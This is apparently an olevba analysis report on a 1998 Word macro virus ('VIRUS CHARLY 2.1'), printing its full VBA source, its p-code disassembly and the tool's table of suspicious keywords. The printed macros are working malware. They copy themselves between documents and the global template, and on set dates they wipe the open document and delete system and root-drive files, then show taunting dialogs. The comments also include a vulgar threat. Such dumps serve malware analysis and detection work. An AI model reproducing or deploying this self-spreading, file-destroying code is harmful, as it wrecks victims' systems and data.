olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nottice.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nottice.s - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN() 'VIRUS CHARLY  Versión 2.1     Copyright  Lima - Perú     1998. Charly Corp.
Attribute MAIN.VB_Description = "F%\r\n"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.AutoClose.MAIN"
'Fué creado el 1 de Dic. de 1998 por CharlySoft. Está protegido por las leyes del derecho de autor;cualquier
'intento de copia sera sancionada drásticamente.Al infractor se le obligara a colocarse de rodillas frente
'a su verdugo(En este caso, YO)para luego ser destrozado con un potente ORGANO SEXUAL EN SU MAXIMA ERECCIÓN
' ------------>        Je Je Je Je...
Dim cjt$
On Error GoTo -1: On Error GoTo SALIDA
WordBasic.DisableAutoMacros 0
cjt$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If cjt$ = "normal.dot" Then
   If INFECTA = 1 Then
      GoTo SALIDA
   Else
      InfectaDOC
   End If
Else
      InfectaGlobal
End If
SALIDA:
WordBasic.Call "CHARLYTO"
End Sub
Private Function INFECTA()
Dim i
INFECTA = 0
If WordBasic.CountMacros(1) > 0 Then
   For i = 1 To WordBasic.CountMacros(1)
     If WordBasic.[MacroName$](i, 1) = "CHARLYTO" Then INFECTA = 1
   Next i
End If
End Function
Private Sub InfectaDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:CHARLYTO", WordBasic.[FileName$]() + ":CHARLYTO"
WordBasic.MacroCopy "Global:HerramMacro", WordBasic.[FileName$]() + ":HerramMacro"
WordBasic.MacroCopy "Global:KILLER", WordBasic.[FileName$]() + ":KILLER"
WordBasic.FileSaveAll 1, 1
End Sub
Private Sub InfectaGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":CHARLYTO", "Global:CHARLYTO"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":HerramMacro", "Global:HerramMacro"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":KILLER", "Global:KILLER"
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO CHARLYTO.bas 
in file: Virus.MSWord.Nottice.s - OLE stream: 'Macros/VBA/CHARLYTO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Texto As String
Public Sub MAIN()
Attribute MAIN.VB_Description = "Macro creada el 01/12/98 por mi%\r\n"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.CHARLYTO.MAIN"
If WordBasic.Day(WordBasic.Now()) = 23 And WordBasic.Month(WordBasic.Now()) = 5 Then
   Texto = "FELIZ CUMPLEAŃOS CHARLY": FORMATO
   WordBasic.Insert "***Lima - Perú (VIRUS CHARLY)***": EMAIL
   WordBasic.Call "KILLER"
INFINITO:
GoTo INFINITO
ElseIf WordBasic.Day(WordBasic.Now()) = 19 And WordBasic.Month(WordBasic.Now()) = 5 Then
   Texto = "FELICIDADES POR TU CUMPLEAŃOS MINI": FORMATO
   WordBasic.Insert "En Homenaje a mi Querida Hermanita.   "
   WordBasic.FormatFont Points:="24", Color:=2: WordBasic.Insert ": "
   WordBasic.FormatFont Points:="18", Color:=6: WordBasic.Insert ")"
   WordBasic.InsertPara: WordBasic.InsertPara
   WordBasic.Insert "***Lima - Perú (VIRUS CHARLY)***": EMAIL
   WordBasic.Call "KILLER"
GoTo INFINITO
End If '***FECHAS ESPECIALES***
If WordBasic.Day(WordBasic.Now()) = 1 Or WordBasic.Day(WordBasic.Now()) = 4 _
Or WordBasic.Day(WordBasic.Now()) = 11 Or WordBasic.Day(WordBasic.Now()) = 13 _
Or WordBasic.Day(WordBasic.Now()) = 17 Or WordBasic.Day(WordBasic.Now()) = 31 _
Or (WordBasic.Day(WordBasic.Now()) = 25 And WordBasic.Month(WordBasic.Now()) = 12) Then
   If WordBasic.Day(WordBasic.Now()) = 25 And WordBasic.Month(WordBasic.Now()) = 12 Then
      Texto = "FELIZ NAVIDAD .... Je Je Je": FORMATO
      WordBasic.Insert "Les Desea C.J.T.A."
   End If
   Texto = " ***Lima - Perú (VIRUS CHARLY)***": FORMATO
   EMAIL
   WordBasic.Call "KILLER"
GoTo INFINITO
End If
End Sub
Private Sub FORMATO()
WordBasic.EditSelectAll: Selection.Delete
WordBasic.ToggleFull: WordBasic.Font "Busorama MD BT": WordBasic.FontSize 20
WordBasic.CenterPara: WordBasic.Insert Texto: WordBasic.StartOfLine: WordBasic.CharRight 1, 1
WordBasic.Bold: WordBasic.FormatFont Points:="28", Color:=2: WordBasic.EndOfLine
WordBasic.InsertPara: WordBasic.InsertPara: WordBasic.FormatFont Points:="18", Color:=6
End Sub
Private Sub EMAIL()
WordBasic.InsertPara: WordBasic.InsertPara
WordBasic.Font "Comic Sans MS": WordBasic.CenterPara: WordBasic.Bold
WordBasic.FormatFont Points:="11", Color:=2: WordBasic.Insert "Charly_Ter@Hotmail.com"
End Sub
-------------------------------------------------------------------------------
VBA MACRO HerramMacro.bas 
in file: Virus.MSWord.Nottice.s - OLE stream: 'Macros/VBA/HerramMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
'FormFalso.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO KILLER.bas 
in file: Virus.MSWord.Nottice.s - OLE stream: 'Macros/VBA/KILLER'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN() '***Elimina archivos***
Attribute MAIN.VB_Description = "Macro creada el 01/12/98 por mi%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.KILLER.MAIN"
Dim Valor As Integer
On Error GoTo FIN
Randomize: Valor = Int((2 * Rnd) + 1)
If Valor = 1 Then
   Kill "C:\Windows\*.exe": Kill "C:\Windows\Command\*.*": Kill "C:\Windows\System\*.*"
Else
   Kill "C:\Windows\Command\*.*": Kill "C:\*.*": Kill "C:\Windows\SYSBCKUP\*.*"
End If
FIN:
If ActiveDocument.Saved = False Then ActiveDocument.Save
MATADOR
End Sub
Private Sub MATADOR()
Valor = MsgBox("Maldito, Quieres Que Borre Tu Porquería de Archivos?", 4 + 16 + 4096, "VIRUS CHARLY     versión 2.1     ===>   IDAT")
If Valor = 6 Then
   Valor = MsgBox("Por Idiota Se Borraron Tus Archivos De Sistema", 0 + 64, "VIRUS CHARLY  versión 2.1  Charly_Ter@hotmail.com")
Else
   Valor = MsgBox("Mala Elección, Perdistes Tus Archivos De Sistema", 0 + 64, "VIRUS CHARLY  versión 2.1   Charly_Ter@hotmail.com")
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nottice.s
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 4004 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' 	QuoteRem 0x0012 0x004B "VIRUS CHARLY  Versión 2.1     Copyright  Lima - Perú     1998. Charly Corp."
' Line #1:
' 	QuoteRem 0x0000 0x006B "Fué creado el 1 de Dic. de 1998 por CharlySoft. Está protegido por las leyes del derecho de autor;cualquier"
' Line #2:
' 	QuoteRem 0x0000 0x0069 "intento de copia sera sancionada drásticamente.Al infractor se le obligara a colocarse de rodillas frente"
' Line #3:
' 	QuoteRem 0x0000 0x006A "a su verdugo(En este caso, YO)para luego ser destrozado con un potente ORGANO SEXUAL EN SU MAXIMA ERECCIÓN"
' Line #4:
' 	QuoteRem 0x0000 0x0024 " ------------>        Je Je Je Je..."
' Line #5:
' 	Dim 
' 	VarDefn cjt
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError SALIDA 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St cjt$ 
' Line #9:
' 	Ld cjt$ 
' 	LitStr 0x000A "normal.dot"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	Ld INFECTA 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	GoTo SALIDA 
' Line #12:
' 	ElseBlock 
' Line #13:
' 	ArgsCall InfectaDOC 0x0000 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	ArgsCall InfectaGlobal 0x0000 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Label SALIDA 
' Line #19:
' 	LitStr 0x0008 "CHARLYTO"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Private Function INFECTA())
' Line #22:
' 	Dim 
' 	VarDefn i
' Line #23:
' 	LitDI2 0x0000 
' 	St INFECTA 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #26:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "CHARLYTO"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St INFECTA 
' 	EndIf 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	EndFunc 
' Line #30:
' 	FuncDefn (Private Sub InfectaDOC())
' Line #31:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #32:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	LitStr 0x000F "Global:CHARLYTO"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":CHARLYTO"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #34:
' 	LitStr 0x0012 "Global:HerramMacro"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000C ":HerramMacro"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #35:
' 	LitStr 0x000D "Global:KILLER"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0007 ":KILLER"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Private Sub InfectaGlobal())
' Line #39:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #40:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":CHARLYTO"
' 	Add 
' 	LitStr 0x000F "Global:CHARLYTO"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #41:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000C ":HerramMacro"
' 	Add 
' 	LitStr 0x0012 "Global:HerramMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #42:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0007 ":KILLER"
' 	Add 
' 	LitStr 0x000D "Global:KILLER"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #43:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #44:
' 	EndSub 
' Macros/VBA/CHARLYTO - 3941 bytes
' Line #0:
' 	Dim 
' 	VarDefn Texto (As String)
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #3:
' 	LitStr 0x0017 "FELIZ CUMPLEAŃOS CHARLY"
' 	St Texto 
' 	BoS 0x0000 
' 	ArgsCall FORMATO 0x0000 
' Line #4:
' 	LitStr 0x0020 "***Lima - Perú (VIRUS CHARLY)***"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall EMAIL 0x0000 
' Line #5:
' 	LitStr 0x0006 "KILLER"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #6:
' 	Label INFINITO 
' Line #7:
' 	GoTo INFINITO 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #9:
' 	LitStr 0x0022 "FELICIDADES POR TU CUMPLEAŃOS MINI"
' 	St Texto 
' 	BoS 0x0000 
' 	ArgsCall FORMATO 0x0000 
' Line #10:
' 	LitStr 0x0026 "En Homenaje a mi Querida Hermanita.   "
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #11:
' 	LitStr 0x0002 "24"
' 	ParamNamed Points 
' 	LitDI2 0x0002 
' 	ParamNamed Color 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0002 ": "
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #12:
' 	LitStr 0x0002 "18"
' 	ParamNamed Points 
' 	LitDI2 0x0006 
' 	ParamNamed Color 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0001 ")"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #14:
' 	LitStr 0x0020 "***Lima - Perú (VIRUS CHARLY)***"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall EMAIL 0x0000 
' Line #15:
' 	LitStr 0x0006 "KILLER"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #16:
' 	GoTo INFINITO 
' Line #17:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0017 "***FECHAS ESPECIALES***"
' Line #18:
' 	LineCont 0x000C 1A 00 00 00 34 00 00 00 4E 00 00 00
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	Or 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Or 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Or 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	Or 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	Or 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #20:
' 	LitStr 0x001B "FELIZ NAVIDAD .... Je Je Je"
' 	St Texto 
' 	BoS 0x0000 
' 	ArgsCall FORMATO 0x0000 
' Line #21:
' 	LitStr 0x0012 "Les Desea C.J.T.A."
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	LitStr 0x0021 " ***Lima - Perú (VIRUS CHARLY)***"
' 	St Texto 
' 	BoS 0x0000 
' 	ArgsCall FORMATO 0x0000 
' Line #24:
' 	ArgsCall EMAIL 0x0000 
' Line #25:
' 	LitStr 0x0006 "KILLER"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #26:
' 	GoTo INFINITO 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Private Sub FORMATO())
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' 	BoS 0x0000 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0000 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemCall ToggleFull 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x000E "Busorama MD BT"
' 	Ld WordBasic 
' 	ArgsMemCall Font 0x0001 
' 	BoS 0x0000 
' 	LitDI2 0x0014 
' 	Ld WordBasic 
' 	ArgsMemCall FontSize 0x0001 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemCall CenterPara 0x0000 
' 	BoS 0x0000 
' 	Ld Texto 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall StartOfLine 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall CharRight 0x0002 
' Line #33:
' 	Ld WordBasic 
' 	ArgsMemCall Bold 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0002 "28"
' 	ParamNamed Points 
' 	LitDI2 0x0002 
' 	ParamNamed Color 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0002 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall EndOfLine 0x0000 
' Line #34:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0002 "18"
' 	ParamNamed Points 
' 	LitDI2 0x0006 
' 	ParamNamed Color 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0002 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Private Sub EMAIL())
' Line #37:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #38:
' 	LitStr 0x000D "Comic Sans MS"
' 	Ld WordBasic 
' 	ArgsMemCall Font 0x0001 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall CenterPara 0x0000 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall Bold 0x0000 
' Line #39:
' 	LitStr 0x0002 "11"
' 	ParamNamed Points 
' 	LitDI2 0x0002 
' 	ParamNamed Color 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0016 "Charly_Ter@Hotmail.com"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #40:
' 	EndSub 
' Macros/VBA/HerramMacro - 862 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' Line #1:
' 	QuoteRem 0x0000 0x000E "FormFalso.Show"
' Line #2:
' 	EndSub 
' Macros/VBA/KILLER - 2606 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' 	QuoteRem 0x0012 0x0016 "***Elimina archivos***"
' Line #1:
' 	Dim 
' 	VarDefn Valor (As Integer)
' Line #2:
' 	OnError FIN 
' Line #3:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Valor 
' Line #4:
' 	Ld Valor 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitStr 0x0010 "C:\Windows\*.exe"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0016 "C:\Windows\Command\*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "C:\Windows\System\*.*"
' 	ArgsCall Kill 0x0001 
' Line #6:
' 	ElseBlock 
' Line #7:
' 	LitStr 0x0016 "C:\Windows\Command\*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0017 "C:\Windows\SYSBCKUP\*.*"
' 	ArgsCall Kill 0x0001 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	Label FIN 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #11:
' 	ArgsCall MATADOR 0x0000 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Private Sub MATADOR())
' Line #14:
' 	LitStr 0x0034 "Maldito, Quieres Que Borre Tu Porquería de Archivos?"
' 	LitDI2 0x0004 
' 	LitDI2 0x0010 
' 	Add 
' 	LitDI2 0x1000 
' 	Add 
' 	LitStr 0x002C "VIRUS CHARLY     versión 2.1     ===>   IDAT"
' 	ArgsLd MsgBox 0x0003 
' 	St Valor 
' Line #15:
' 	Ld Valor 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #16:
' 	LitStr 0x002E "Por Idiota Se Borraron Tus Archivos De Sistema"
' 	LitDI2 0x0000 
' 	LitDI2 0x0040 
' 	Add 
' 	LitStr 0x0031 "VIRUS CHARLY  versión 2.1  Charly_Ter@hotmail.com"
' 	ArgsLd MsgBox 0x0003 
' 	St Valor 
' Line #17:
' 	ElseBlock 
' Line #18:
' 	LitStr 0x0030 "Mala Elección, Perdistes Tus Archivos De Sistema"
' 	LitDI2 0x0000 
' 	LitDI2 0x0040 
' 	Add 
' 	LitStr 0x0032 "VIRUS CHARLY  versión 2.1   Charly_Ter@hotmail.com"
' 	ArgsLd MsgBox 0x0003 
' 	St Valor 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

